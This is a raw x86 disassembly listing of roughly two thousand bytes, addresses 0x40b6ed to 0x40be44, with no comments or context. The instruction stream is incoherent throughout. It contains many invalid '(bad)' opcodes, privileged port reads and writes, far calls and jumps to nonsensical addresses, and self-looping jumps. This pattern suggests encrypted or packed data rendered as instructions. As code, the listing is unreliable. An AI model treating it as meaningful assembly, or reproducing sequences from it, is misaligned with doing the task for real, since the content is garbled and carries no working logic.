  40b6ed:	push   esi
  40b6ee:	mov    esp,0x1809a8dd
  40b6f3:	ins    DWORD PTR es:[edi],dx
  40b6f4:	mov    ah,0xa5
  40b6f6:	fdivr  st,st(1)
  40b6f8:	fs or  ah,cl
  40b6fb:	sub    dh,ah
  40b6fd:	ret    0xc124
  40b700:	xchg   esi,eax
  40b701:	push   esp
  40b702:	jno    0x40b780
  40b704:	adc    BYTE PTR [esi-0x16],cl
  40b707:	test   BYTE PTR [ebx+ebx*8-0x2e],cl
  40b70b:	dec    esp
  40b70c:	mov    ?,WORD PTR [edi]
  40b70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b70f:	dec    eax
  40b710:	daa    
  40b711:	cmp    al,0xa4
  40b713:	sub    cl,BYTE PTR [edx+0x6e]
  40b716:	daa    
  40b717:	clc    
  40b718:	std    
  40b719:	sub    DWORD PTR [ebp-0x2649c3d7],0x9a4d8820
  40b723:	cmc    
  40b724:	adc    ch,bl
  40b726:	daa    
  40b727:	sub    eax,0x2ebef317
  40b72c:	ja     0x40b790
  40b72e:	fisubr DWORD PTR [eax-0x784f8d1d]
  40b734:	pop    esi
  40b735:	pop    ds
  40b736:	lods   eax,DWORD PTR ds:[esi]
  40b737:	sub    DWORD PTR [esi-0x7f77f280],eax
  40b73d:	sbb    al,0x3d
  40b73f:	jne    0x40b760
  40b741:	sahf   
  40b742:	dec    edx
  40b744:	mov    dh,bl
  40b746:	out    dx,eax
  40b747:	test   al,0xe4
  40b749:	push   es
  40b74a:	pop    edi
  40b74b:	(bad)  
  40b74c:	shr    BYTE PTR [edi],cl
  40b74e:	ret    
  40b74f:	mov    BYTE PTR [ecx],al
  40b751:	pop    esi
  40b752:	popf   
  40b753:	call   0xd3c12885
  40b758:	sub    eax,0xdaaff74b
  40b75d:	cs add BYTE PTR ss:[eax+0x57],bl
  40b762:	clc    
  40b763:	push   0x86be0752
  40b768:	out    0x45,eax
  40b76a:	enter  0x58ad,0x4e
  40b76e:	inc    esp
  40b76f:	push   ebp
  40b770:	sbb    al,0x90
  40b772:	jle    0x40b7c3
  40b774:	sahf   
  40b775:	mov    bh,0x6a
  40b777:	mov    esp,0x5603589e
  40b77c:	(bad)  
  40b77d:	sub    al,0x4e
  40b77f:	xchg   ecx,eax
  40b780:	retf   0xf4b2
  40b783:	inc    ecx
  40b784:	icebp  
  40b785:	cld    
  40b786:	push   esp
  40b787:	loop   0x40b801
  40b789:	mov    edx,0x95c82bc
  40b78e:	inc    eax
  40b78f:	or     al,ah
  40b791:	push   ss
  40b792:	call   0x71d6ca1f
  40b797:	sti    
  40b798:	fiadd  WORD PTR [esi]
  40b79a:	(bad)  
  40b79b:	in     eax,0x8f
  40b79d:	pop    ebp
  40b79e:	fwait
  40b79f:	test   al,0xd1
  40b7a1:	mov    ecx,0x40607c1c
  40b7a6:	jmp    0x40b774
  40b7a8:	clc    
  40b7a9:	mov    edx,0xe1884c88
  40b7ae:	add    DWORD PTR [eax-0x5e],esp
  40b7b1:	out    dx,eax
  40b7b2:	fidiv  DWORD PTR [edx+0x3c4bf2d7]
  40b7b8:	push   ebx
  40b7b9:	fisttp QWORD PTR [esi-0x55]
  40b7bc:	jns    0x40b833
  40b7be:	inc    esi
  40b7bf:	push   0xe9f97b82
  40b7c4:	mov    al,0xf1
  40b7c6:	or     DWORD PTR [ecx],edx
  40b7c8:	daa    
  40b7c9:	int3   
  40b7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7cb:	add    ah,BYTE PTR [ebx-0x4c27e001]
  40b7d1:	inc    edi
  40b7d2:	in     eax,dx
  40b7d3:	xor    BYTE PTR [eax+eax*8+0x9d13aeb],ah
  40b7da:	mov    eax,ds:0x1c5dc269
  40b7df:	daa    
  40b7e0:	xor    edi,DWORD PTR [edx-0x4dcccf4f]
  40b7e6:	retf   
  40b7e7:	int3   
  40b7e8:	or     al,0x25
  40b7ea:	nop
  40b7eb:	in     al,dx
  40b7ec:	dec    esp
  40b7ed:	les    edi,FWORD PTR [ecx]
  40b7ef:	mov    ebp,0xeeafc615
  40b7f4:	jle    0x40b7bc
  40b7f6:	retf   
  40b7f7:	sbb    DWORD PTR ss:[esp+eax*1+0x1c],ecx
  40b7fc:	and    DWORD PTR [ecx-0x3ed396a0],0x15d5dca0
  40b806:	js     0x40b7fc
  40b808:	sbb    DWORD PTR [edi],0xffffff8f
  40b80b:	in     al,dx
  40b80c:	dec    eax
  40b80d:	pushf  
  40b80e:	sbb    ebp,DWORD PTR [esp+eax*8+0x4]
  40b812:	fsub   st,st(3)
  40b814:	into   
  40b815:	popf   
  40b816:	jle    0x40b886
  40b818:	mov    ah,BYTE PTR [edx+0x38]
  40b81b:	fistp  QWORD PTR [edx-0x3e9181cd]
  40b821:	cs pop es
  40b823:	pop    eax
  40b824:	das    
  40b825:	std    
  40b826:	or     BYTE PTR [ecx-0x69008ee8],ch
  40b82c:	lahf   
  40b82d:	push   esi
  40b82e:	ds sbb eax,ebx
  40b831:	jp     0x40b87d
  40b833:	and    DWORD PTR [edi-0x58],0xffffffe9
  40b837:	(bad)  
  40b838:	js     0x40b875
  40b83a:	pop    eax
  40b83b:	lds    ebp,FWORD PTR [esi+ebx*2]
  40b83e:	mov    ebx,ds
  40b840:	sahf   
  40b841:	fidiv  DWORD PTR [ebp+0x52]
  40b844:	xchg   ebp,eax
  40b845:	fwait
  40b846:	xor    edx,edx
  40b848:	std    
  40b849:	fwait
  40b84a:	cwde   
  40b84b:	jbe    0x40b813
  40b84d:	pop    esi
  40b84e:	jmp    esp
  40b850:	add    DWORD PTR [ebx+0x1f],esp
  40b853:	sub    al,0xf
  40b855:	stos   DWORD PTR es:[edi],eax
  40b856:	push   esi
  40b857:	stos   DWORD PTR es:[edi],eax
  40b858:	out    0x9b,eax
  40b85a:	xchg   esi,eax
  40b85b:	das    
  40b85c:	push   esp
  40b85d:	cwde   
  40b85e:	push   ebx
  40b85f:	arpl   sp,cx
  40b861:	test   eax,0x1edd7e07
  40b866:	add    bh,BYTE PTR [edx-0x7c]
  40b869:	pop    ds
  40b86a:	sbb    DWORD PTR [esi+0x5a65806d],esi
  40b870:	add    DWORD PTR [esi],0x68
  40b873:	in     al,0xf7
  40b875:	sbb    BYTE PTR [edi+0x38],0x6f
  40b879:	xor    esp,DWORD PTR [eax+0x6fc48598]
  40b87f:	hlt    
  40b880:	shl    bl,1
  40b882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b883:	adc    bl,bl
  40b885:	jg     0x40b837
  40b887:	cld    
  40b888:	cmp    BYTE PTR [ecx+ebx*8],ch
  40b88b:	cmp    al,0x77
  40b88d:	jmp    0x40b909
  40b88f:	xchg   esp,eax
  40b890:	inc    ebx
  40b891:	fcomp  st(5)
  40b893:	push   ss
  40b894:	and    BYTE PTR [ebx],ah
  40b896:	pop    ecx
  40b897:	stc    
  40b898:	jge    0x40b8a0
  40b89a:	pop    esi
  40b89b:	dec    ecx
  40b89c:	sbb    eax,0xf3174bae
  40b8a1:	fistp  DWORD PTR [ecx-0x49fe1ca0]
  40b8a7:	xchg   edx,eax
  40b8a8:	mov    dh,0xb7
  40b8aa:	in     eax,0x5b
  40b8ac:	and    esi,DWORD PTR [ecx-0x6ac8844e]
  40b8b2:	pop    edx
  40b8b3:	sbb    BYTE PTR [ebx],dh
  40b8b5:	fisttp DWORD PTR [edi+eax*2-0x7e923608]
  40b8bc:	aam    0xff
  40b8be:	call   0xfd7a:0x6330a663
  40b8c5:	adc    eax,0x73f47ae0
  40b8ca:	rcr    ebp,cl
  40b8cc:	jmp    0x40b8cc
  40b8ce:	call   0xd6843604
  40b8d3:	push   cs
  40b8d4:	repz push ecx
  40b8d6:	into   
  40b8d7:	scas   al,BYTE PTR es:[edi]
  40b8d8:	pop    ds
  40b8d9:	jnp    0x40b8be
  40b8db:	dec    ecx
  40b8dc:	dec    ecx
  40b8dd:	jecxz  0x40b8dd
  40b8df:	mov    bl,0x26
  40b8e1:	out    0xe,eax
  40b8e3:	cmp    esp,esi
  40b8e5:	sub    edx,DWORD PTR [eax-0x63]
  40b8e8:	and    edx,DWORD PTR [ebp+0x2b]
  40b8eb:	and    eax,0x3b61b282
  40b8f0:	addr16 jp 0x40b8a6
  40b8f3:	into   
  40b8f4:	int    0x3
  40b8f6:	int3   
  40b8f7:	or     BYTE PTR ds:0xc228972a,dl
  40b8fd:	mov    bh,0x0
  40b8ff:	jns    0x40b90d
  40b901:	lock stc 
  40b903:	scas   eax,DWORD PTR es:[edi]
  40b904:	or     dh,BYTE PTR [eax+0xc493e58]
  40b90a:	mov    ds:0x533b4108,al
  40b90f:	enter  0xaeb8,0x5d
  40b913:	jne    0x40b898
  40b915:	xlat   BYTE PTR ds:[ebx]
  40b916:	add    al,0xed
  40b918:	mov    eax,0xb5b4da88
  40b91d:	cmp    al,0x19
  40b91f:	and    ch,BYTE PTR [eax+ebx*2+0x6050a628]
  40b926:	shl    esi,1
  40b928:	push   edx
  40b929:	fst    QWORD PTR [esi]
  40b92b:	mov    WORD PTR [ebx],gs
  40b92d:	xchg   DWORD PTR [esi-0x33],ecx
  40b930:	shl    DWORD PTR [esi-0x3a6829b0],1
  40b936:	pop    ebx
  40b937:	loop   0x40b9a5
  40b939:	dec    esp
  40b93a:	lea    ebx,[ebx+0x26efd844]
  40b940:	push   esp
  40b941:	shr    BYTE PTR [esi-0x71],0x67
  40b945:	pop    eax
  40b946:	scas   al,BYTE PTR es:[edi]
  40b947:	push   0xffffff9e
  40b949:	in     eax,0x53
  40b94b:	call   0x9de32e3c
  40b950:	clc    
  40b951:	shl    esi,1
  40b953:	inc    eax
  40b954:	out    dx,al
  40b955:	(bad)  
  40b956:	push   ds
  40b957:	cmp    al,0xa6
  40b959:	ja     0x40b8e5
  40b95b:	cmc    
  40b95c:	test   BYTE PTR [esi+0x324988d4],0x8a
  40b963:	mov    esi,0x346c881e
  40b968:	cmp    al,0xd3
  40b96a:	cwde   
  40b96b:	add    edi,DWORD PTR [ebp+0x74b7a98e]
  40b971:	fcmovbe st,st(3)
  40b973:	mov    esi,0x2a799b23
  40b978:	iret   
  40b979:	sbb    al,0xda
  40b97b:	pop    eax
  40b97c:	adc    ebx,ebp
  40b97e:	movd   mm1,DWORD PTR [edx+0x6f8328fa]
  40b985:	(bad)  
  40b986:	mov    ch,0xf4
  40b988:	in     al,0x64
  40b98a:	pushf  
  40b98b:	sbb    eax,0x3ead8693
  40b990:	push   ebx
  40b991:	pop    ebp
  40b992:	aas    
  40b993:	lds    esp,FWORD PTR [ebp+0x3e1dc4c4]
  40b999:	(bad)  
  40b99b:	pop    esi
  40b99c:	aaa    
  40b99d:	mov    dl,0xa6
  40b99f:	lahf   
  40b9a0:	mov    eax,ds:0x3710f738
  40b9a5:	sbb    esi,DWORD PTR [edx-0x341398f]
  40b9ab:	fld    TBYTE PTR [edi+ebp*8+0x3d]
  40b9af:	out    dx,eax
  40b9b0:	shr    BYTE PTR [edi-0x7d],0xd1
  40b9b4:	out    dx,eax
  40b9b5:	icebp  
  40b9b6:	sub    al,0x41
  40b9b8:	loopne 0x40b94a
  40b9ba:	sbb    DWORD PTR [edi+0x2f],0xc9c3410b
  40b9c1:	push   ss
  40b9c2:	add    esp,DWORD PTR [ecx+edx*2+0x59]
  40b9c6:	ss push es
  40b9c8:	aaa    
  40b9c9:	test   eax,0x4f84f278
  40b9ce:	inc    edx
  40b9cf:	addr16 jo 0x40ba0b
  40b9d2:	pop    ecx
  40b9d3:	aaa    
  40b9d4:	enter  0x5e63,0xb9
  40b9d8:	hlt    
  40b9d9:	mov    bh,0xdb
  40b9db:	mov    edi,0x7fa9da84
  40b9e1:	cmp    eax,0x9731b9
  40b9e6:	jns    0x40ba02
  40b9e8:	inc    ecx
  40b9e9:	in     eax,dx
  40b9ea:	fs mov dl,0x49
  40b9ed:	sahf   
  40b9ee:	dec    ebx
  40b9ef:	sbb    ebx,DWORD PTR [eax-0xe721f9b]
  40b9f5:	xor    BYTE PTR [esi+ebp*2],ch
  40b9f8:	push   esp
  40b9f9:	adc    dh,dh
  40b9fb:	out    dx,eax
  40b9fc:	and    dl,BYTE PTR [edx]
  40b9fe:	in     al,0x33
  40ba00:	outs   dx,DWORD PTR ds:[esi]
  40ba01:	sub    esi,DWORD PTR [edx+ebp*4]
  40ba04:	lea    ebp,[edi]
  40ba06:	sub    eax,0xf65e86a
  40ba0b:	xor    esi,DWORD PTR [eax-0x24649032]
  40ba11:	call   FWORD PTR ds:0xeed2a35a
  40ba17:	clc    
  40ba18:	and    ah,dh
  40ba1a:	test   al,0xff
  40ba1c:	inc    esp
  40ba1d:	or     ch,BYTE PTR [eax]
  40ba1f:	mov    ecx,DWORD PTR [esi+eax*1+0x18]
  40ba23:	cwde   
  40ba24:	or     ecx,esp
  40ba26:	push   es
  40ba27:	mov    esi,0x22afea1e
  40ba2c:	fwait
  40ba2d:	stc    
  40ba2e:	push   esp
  40ba2f:	sub    eax,0x998ab633
  40ba34:	enter  0x211e,0xfd
  40ba38:	jp     0x40b9ff
  40ba3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba3b:	sub    eax,0xb25eb76
  40ba40:	sub    ecx,DWORD PTR [ebx-0x6242ec1]
  40ba46:	cld    
  40ba47:	adc    BYTE PTR [ebp+esi*2-0x79],cl
  40ba4b:	loop   0x40ba43
  40ba4d:	fistp  DWORD PTR [edx+0x12c07777]
  40ba53:	jno    0x40b9f2
  40ba55:	jp     0x40ba0a
  40ba57:	inc    eax
  40ba58:	mov    edi,DWORD PTR [esi+0x1a]
  40ba5b:	jnp    0x40b9f0
  40ba5d:	pop    eax
  40ba5e:	inc    esi
  40ba5f:	retf   
  40ba60:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40ba62:	outs   dx,BYTE PTR ds:[esi]
  40ba63:	jb     0x40bac2
  40ba65:	arpl   WORD PTR [eax],di
  40ba67:	call   0xa829d764
  40ba6c:	pop    esi
  40ba6d:	retf   
  40ba6e:	pop    edx
  40ba6f:	mov    WORD PTR [esi+eax*8-0x72a00c44],ds
  40ba76:	(bad)  
  40ba77:	aam    0xf6
  40ba79:	inc    esi
  40ba7a:	rol    DWORD PTR [edi],1
  40ba7c:	dec    esi
  40ba7d:	xor    eax,0xfbfbe92b
  40ba82:	(bad)  
  40ba83:	fldcw  WORD PTR [ebx]
  40ba85:	xor    eax,0x84128a76
  40ba8a:	jo     0x40baa4
  40ba8c:	cmc    
  40ba8d:	adc    BYTE PTR [esi-0x49],0x8e
  40ba91:	outs   dx,DWORD PTR ds:[esi]
  40ba92:	test   al,0x47
  40ba94:	not    BYTE PTR [ecx]
  40ba96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba97:	xchg   esi,eax
  40ba98:	cmp    eax,0xdc994dab
  40ba9d:	imul   esi,ebp,0xffffff81
  40baa0:	sub    al,0x4b
  40baa2:	leave  
  40baa3:	sub    cl,BYTE PTR [edx+0x6101ed41]
  40baa9:	int    0x4f
  40baab:	sub    DWORD PTR [eax+0x51cf8f8a],edi
  40bab1:	mov    ecx,DWORD PTR [edx+edx*8]
  40bab4:	sahf   
  40bab5:	out    dx,al
  40bab6:	call   0x108d:0x1f97a676
  40babd:	imul   esi,esi,0xffffffd2
  40bac0:	ret    0x7ada
  40bac3:	xchg   esp,eax
  40bac4:	lahf   
  40bac5:	inc    ebp
  40bac6:	popa   
  40bac7:	fbstp  TBYTE PTR [edx+0x4e]
  40baca:	inc    ecx
  40bacb:	div    ah
  40bacd:	sub    al,0xbc
  40bacf:	or     BYTE PTR [ecx-0x63253acd],dh
  40bad5:	out    dx,eax
  40bad6:	aad    0xee
  40bad8:	mov    ecx,DWORD PTR [ebx+0x6d]
  40badb:	lahf   
  40badc:	push   esp
  40badd:	stc    
  40bade:	ds out 0xa8,eax
  40bae1:	fisub  WORD PTR [ebx]
  40bae3:	sbb    BYTE PTR [edi],bh
  40bae5:	es inc edi
  40bae7:	lds    ecx,FWORD PTR [ecx+eiz*4]
  40baea:	sub    edx,DWORD PTR [edi]
  40baec:	repnz imul BYTE PTR [ebx-0x41b06cc7]
  40baf3:	repnz inc edx
  40baf5:	sbb    edi,DWORD PTR [edi-0x7d146fa0]
  40bafb:	cwde   
  40bafc:	cmp    eax,0x56c4ad9b
  40bb01:	mov    bh,0x58
  40bb03:	fnsave [ebx]
  40bb05:	shl    BYTE PTR [ecx],0x61
  40bb08:	iret   
  40bb09:	cmp    bh,BYTE PTR ds:0xd0510bf7
  40bb0f:	outs   dx,BYTE PTR ds:[esi]
  40bb10:	das    
  40bb11:	inc    eax
  40bb12:	jmp    0x114a:0xbb5fa806
  40bb19:	xchg   BYTE PTR [edx+0xccd9775],al
  40bb1f:	fisubr WORD PTR [ebx+edi*8]
  40bb22:	addr16 jmp 0x6b2b:0xabc4b2d7
  40bb2a:	dec    esi
  40bb2b:	lahf   
  40bb2c:	shl    ebp,1
  40bb2e:	jbe    0x40bb53
  40bb30:	pop    ds
  40bb31:	out    dx,eax
  40bb32:	mov    BYTE PTR [ecx-0x3fa5a9af],bh
  40bb38:	call   0x2263:0x8858c733
  40bb3f:	data16 sub al,0xb8
  40bb42:	mov    ds:0xc11378f0,eax
  40bb47:	cld    
  40bb48:	stos   DWORD PTR es:[edi],eax
  40bb49:	(bad)  
  40bb4a:	pop    edx
  40bb4b:	mov    dl,0x20
  40bb4d:	or     ebp,DWORD PTR [ebx+0x4a]
  40bb50:	mov    DWORD PTR [ebx],ecx
  40bb52:	jnp    0x40bb64
  40bb54:	(bad)  
  40bb56:	and    bh,BYTE PTR [eax]
  40bb58:	cmp    ebp,eax
  40bb5a:	xor    edi,DWORD PTR ds:0xe140d238
  40bb60:	test   eax,0xef0f11fb
  40bb65:	mov    ecx,0xc8ab9c8f
  40bb6a:	nop
  40bb6b:	bound  esi,QWORD PTR [ebp-0x56]
  40bb6e:	inc    edx
  40bb6f:	mov    eax,0x1e1bdef
  40bb74:	xchg   ebp,eax
  40bb75:	inc    ecx
  40bb76:	xchg   BYTE PTR [ebx-0x43062609],al
  40bb7c:	and    bh,cl
  40bb7e:	lods   eax,DWORD PTR ds:[esi]
  40bb7f:	jns    0x40bb99
  40bb81:	ja     0x40bbd5
  40bb83:	fsubr  DWORD PTR ds:0x464d5ffc
  40bb89:	orps   xmm7,XMMWORD PTR [eax-0x63da152b]
  40bb90:	test   esp,esp
  40bb92:	xor    eax,0x545be887
  40bb97:	jecxz  0x40bc00
  40bb99:	or     al,0x43
  40bb9b:	nop
  40bb9c:	ins    DWORD PTR es:[edi],dx
  40bb9d:	shl    BYTE PTR [ebx],1
  40bb9f:	mov    dh,0x92
  40bba1:	xchg   esi,eax
  40bba2:	clc    
  40bba3:	push   eax
  40bba4:	loopne 0x40bb82
  40bba6:	xor    BYTE PTR [edi+0x30],0x35
  40bbaa:	jp     0x40bbd0
  40bbac:	sub    al,BYTE PTR [edi+0x78]
  40bbaf:	lea    ecx,[edx]
  40bbb1:	xchg   ebx,eax
  40bbb2:	push   ecx
  40bbb3:	sahf   
  40bbb4:	in     al,dx
  40bbb5:	js     0x40bc0e
  40bbb7:	lods   al,BYTE PTR ds:[esi]
  40bbb8:	inc    edi
  40bbb9:	xchg   ebp,eax
  40bbba:	inc    esi
  40bbbb:	fs daa 
  40bbbd:	or     esp,DWORD PTR [eax+0x3b84d411]
  40bbc3:	test   dh,al
  40bbc5:	push   ebx
  40bbc6:	add    al,0xcc
  40bbc8:	xchg   ebp,eax
  40bbc9:	(bad)  
  40bbca:	cmp    BYTE PTR [edi],ch
  40bbcc:	jl     0x40bb84
  40bbce:	pusha  
  40bbcf:	cli    
  40bbd0:	pushf  
  40bbd1:	push   DWORD PTR [eax-0x7fb9b0fa]
  40bbd7:	cmp    eax,0x8a9e18f7
  40bbdc:	lods   al,BYTE PTR ds:[esi]
  40bbdd:	dec    ebx
  40bbde:	scas   eax,DWORD PTR es:[edi]
  40bbdf:	and    al,0xfd
  40bbe1:	and    bl,BYTE PTR [esi]
  40bbe3:	sub    bl,al
  40bbe5:	jns    0x40bbfa
  40bbe7:	fdivr  st,st(3)
  40bbe9:	mov    edi,0x5360b005
  40bbee:	ret    
  40bbef:	and    BYTE PTR [ebp+0x6e],bh
  40bbf2:	and    DWORD PTR [edx+0x4a88e404],0x61141925
  40bbfc:	push   ds
  40bbfd:	int    0x3b
  40bbff:	aaa    
  40bc00:	icebp  
  40bc01:	cmp    DWORD PTR [edx+0x7a52c04c],esp
  40bc07:	push   es
  40bc08:	fisttp WORD PTR [ecx-0x7d2653e]
  40bc0e:	jbe    0x40bc7b
  40bc10:	push   0xffffffc3
  40bc12:	mov    esi,0xafcfab86
  40bc17:	cld    
  40bc18:	xchg   ebp,eax
  40bc19:	test   BYTE PTR [edi+0x25],bl
  40bc1c:	in     al,dx
  40bc1d:	or     DWORD PTR [eax],esp
  40bc1f:	mov    bl,0x4d
  40bc21:	mov    cs,WORD PTR [esi]
  40bc23:	xchg   ebp,eax
  40bc24:	mov    esi,0xdee049b8
  40bc29:	pusha  
  40bc2a:	jb     0x40bbd3
  40bc2c:	jnp    0x40bc99
  40bc2e:	sar    DWORD PTR [edi],cl
  40bc30:	cwde   
  40bc31:	pop    edi
  40bc32:	cli    
  40bc33:	mov    esp,0x2b47b02
  40bc38:	js     0x40bca2
  40bc3a:	rol    BYTE PTR [ecx+0x5091a2e7],0xa8
  40bc41:	xor    al,0xff
  40bc43:	in     al,dx
  40bc44:	sub    BYTE PTR ds:0x1123f39f,0xe3
  40bc4b:	jp     0x40bc33
  40bc4d:	sti    
  40bc4e:	pcmpgtb mm3,QWORD PTR ds:0x47b45d07
  40bc55:	loop   0x40bc33
  40bc57:	stc    
  40bc58:	(bad)  
  40bc59:	pop    ds
  40bc5a:	ror    BYTE PTR [ebp-0x5d],0xdb
  40bc5e:	add    al,0x40
  40bc60:	mov    ch,0x9a
  40bc62:	cmp    BYTE PTR [ecx],cl
  40bc64:	mov    ds:0xc444b0ff,al
  40bc69:	sub    DWORD PTR [esi-0x1e8350b7],esi
  40bc6f:	out    0xdc,al
  40bc71:	ret    0x34c5
  40bc74:	mov    eax,DWORD PTR [ecx-0x229a9ea5]
  40bc7a:	mov    bh,0x6
  40bc7c:	(bad)  
  40bc7e:	inc    edi
  40bc7f:	idiv   eax
  40bc81:	fisubr WORD PTR [eax-0x75]
  40bc84:	bound  esp,QWORD PTR [esi+0x6c0da07b]
  40bc8a:	xor    al,cl
  40bc8c:	push   0x5a
  40bc8e:	sub    al,0x7c
  40bc90:	movsx  esi,BYTE PTR [edx+edi*2+0x7]
  40bc95:	lods   al,BYTE PTR ds:[esi]
  40bc96:	and    esp,DWORD PTR [edi-0x50]
  40bc99:	and    DWORD PTR [ecx-0x650e6883],ecx
  40bc9f:	jae    0x40bd00
  40bca1:	inc    ebp
  40bca2:	xor    BYTE PTR ds:0x26e3c136,dl
  40bca8:	push   edi
  40bca9:	in     al,dx
  40bcaa:	mov    ds:0x2a8917a1,al
  40bcaf:	fisttp DWORD PTR [ebp+0x63648d64]
  40bcb5:	add    ch,BYTE PTR [ebx+0x2]
  40bcb8:	pop    ebp
  40bcb9:	test   DWORD PTR [ebx],edx
  40bcbb:	(bad)  
  40bcbc:	push   eax
  40bcbd:	pop    es
  40bcbe:	retf   
  40bcbf:	in     al,0x6e
  40bcc1:	dec    esp
  40bcc2:	jae    0x40bcbf
  40bcc4:	jnp    0x40bc9d
  40bcc6:	sbb    ebp,edx
  40bcc8:	jp     0x40bcac
  40bcca:	ss popa 
  40bccc:	or     ah,dl
  40bcce:	dec    edi
  40bccf:	arpl   cx,si
  40bcd1:	push   cs
  40bcd2:	ds inc esp
  40bcd4:	in     al,0x81
  40bcd6:	shl    cl,cl
  40bcd8:	ret    
  40bcd9:	inc    ebx
  40bcda:	lock mov al,0x76
  40bcdd:	or     bl,BYTE PTR [edi]
  40bcdf:	sbb    ch,0x99
  40bce2:	daa    
  40bce3:	scas   eax,DWORD PTR es:[edi]
  40bce4:	inc    edx
  40bce5:	in     eax,dx
  40bce6:	add    al,0x3
  40bce8:	scas   eax,DWORD PTR es:[edi]
  40bce9:	mov    ebx,0x5e8042d6
  40bcee:	push   eax
  40bcef:	pop    ebx
  40bcf0:	mov    ds:0x75f92357,al
  40bcf5:	xchg   BYTE PTR [edi+ebx*4-0x7e677b85],dh
  40bcfc:	adc    BYTE PTR [edx],0x69
  40bcff:	add    eax,0x2a367b3c
  40bd04:	aaa    
  40bd05:	xchg   edx,eax
  40bd06:	or     esp,eax
  40bd08:	mov    al,0xa6
  40bd0a:	add    al,ch
  40bd0c:	dec    esi
  40bd0d:	push   edx
  40bd0e:	pop    edi
  40bd0f:	neg    BYTE PTR [eax-0x33]
  40bd12:	mov    esi,0xb4d816db
  40bd17:	loope  0x40bcde
  40bd19:	and    ebx,ebp
  40bd1b:	jle    0x40bd80
  40bd1d:	jge    0x40bce8
  40bd1f:	repz or al,0x40
  40bd22:	dec    edi
  40bd23:	jnp    0x40bd97
  40bd25:	add    ah,bh
  40bd27:	shr    edx,0x42
  40bd2a:	mov    ch,0x8f
  40bd2c:	in     eax,0xe8
  40bd2e:	sbb    al,ah
  40bd30:	std    
  40bd31:	nop
  40bd32:	cld    
  40bd33:	test   eax,0x90d68325
  40bd38:	xchg   ebp,eax
  40bd39:	hlt    
  40bd3a:	or     cl,BYTE PTR [eax+eiz*1-0x2c]
  40bd3e:	enter  0x8eee,0x23
  40bd42:	inc    edi
  40bd43:	int3   
  40bd44:	test   al,0xba
  40bd46:	add    ah,BYTE PTR gs:[edx-0x7f]
  40bd4a:	jae    0x40bd77
  40bd4c:	mov    DWORD PTR [esi+0x7dbedd5],esp
  40bd52:	mov    ds:0x66f14149,eax
  40bd57:	push   ss
  40bd58:	mov    bl,0x14
  40bd5a:	retf   0x3ad3
  40bd5d:	cmc    
  40bd5e:	jp     0x40bd73
  40bd60:	(bad)  
  40bd62:	(bad)  
  40bd63:	dec    ebx
  40bd64:	out    0xa6,al
  40bd66:	sub    DWORD PTR gs:[edx],ecx
  40bd69:	out    0x15,eax
  40bd6b:	mov    BYTE PTR [edi],dl
  40bd6d:	pop    esp
  40bd6e:	push   ss
  40bd6f:	and    ecx,DWORD PTR [edx]
  40bd71:	pop    ss
  40bd72:	mov    ah,0x7a
  40bd74:	int    0x89
  40bd76:	les    ecx,FWORD PTR [edx+0x33]
  40bd79:	cli    
  40bd7a:	mov    BYTE PTR [ebp-0x4a],ch
  40bd7d:	dec    eax
  40bd7e:	mov    dh,0xd2
  40bd80:	dec    ebp
  40bd81:	mov    eax,DWORD PTR [edx+0x38]
  40bd84:	add    al,0x75
  40bd86:	sbb    BYTE PTR [ecx],dh
  40bd88:	pushf  
  40bd89:	repnz adc BYTE PTR [eax+0x51f71191],ah
  40bd90:	cwde   
  40bd91:	jle    0x40bdd9
  40bd93:	aam    0x14
  40bd95:	inc    ebp
  40bd96:	jae    0x40bde7
  40bd98:	mov    ds,WORD PTR [eax+0x6f49fb3d]
  40bd9e:	jle    0x40bd54
  40bda0:	jo     0x40bd48
  40bda2:	push   edx
  40bda3:	inc    esp
  40bda4:	int3   
  40bda5:	(bad)  
  40bda6:	push   ds
  40bda7:	mov    al,ds:0x8985444d
  40bdac:	test   al,0xb8
  40bdae:	ins    BYTE PTR es:[edi],dx
  40bdaf:	nop
  40bdb0:	adc    cl,BYTE PTR [ebp+0x3e402a2d]
  40bdb6:	fisub  WORD PTR [esi+0x3b]
  40bdb9:	imul   edx,DWORD PTR [esi],0xd
  40bdbc:	sbb    DWORD PTR [edi+0x16],edx
  40bdbf:	mov    ds:0x78ebf205,eax
  40bdc4:	lea    ebx,[ebx+0x23]
  40bdc7:	test   al,0x78
  40bdc9:	(bad)  
  40bdca:	lock cmp al,0x94
  40bdcd:	mov    dh,0x81
  40bdcf:	fisubr DWORD PTR [ebx]
  40bdd1:	loopne 0x40bd91
  40bdd3:	popa   
  40bdd4:	jle    0x40bdda
  40bdd6:	ret    
  40bdd7:	lods   eax,DWORD PTR ds:[esi]
  40bdd8:	and    bl,BYTE PTR [ecx]
  40bdda:	lods   eax,DWORD PTR ds:[esi]
  40bddb:	not    DWORD PTR [edi-0x49]
  40bdde:	ds xchg esi,eax
  40bde0:	pop    ebp
  40bde1:	sbb    BYTE PTR [eax+0x68406da1],ch
  40bde7:	js     0x40be22
  40bde9:	inc    esp
  40bdea:	sub    al,0xf5
  40bdec:	mov    ds:0x10711803,eax
  40bdf1:	mov    esp,0xd96ecde9
  40bdf6:	or     ecx,DWORD PTR [ecx]
  40bdf8:	fs jmp 0xa70f:0xcb13d822
  40be00:	test   eax,0x9d70925b
  40be05:	shl    BYTE PTR [ecx-0x7dc338d0],cl
  40be0b:	xor    DWORD PTR [eax+0x65],0x13ad2854
  40be12:	lock xor DWORD PTR [eax],edx
  40be15:	loopne 0x40be8d
  40be17:	sub    BYTE PTR [edi+0x7d],bl
  40be1a:	(bad)  
  40be1b:	js     0x40be7a
  40be1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1e:	mov    bh,0x71
  40be20:	int    0xf
  40be22:	imul   esp,DWORD PTR [edx+0xc433671],0x9b9f5adc
  40be2c:	xchg   ecx,eax
  40be2d:	push   ebp
  40be2e:	mov    dl,0xbb
  40be30:	xor    al,0xda
  40be32:	pusha  
  40be33:	xchg   esi,eax
  40be34:	push   ebx
  40be35:	sub    BYTE PTR [edx-0x60],al
  40be38:	add    eax,0x981006ad
  40be3d:	aaa    
  40be3e:	in     al,0x79
  40be40:	dec    eax
  40be41:	dec    ecx
  40be42:	aam    0x1f
  40be44:	dec    esp
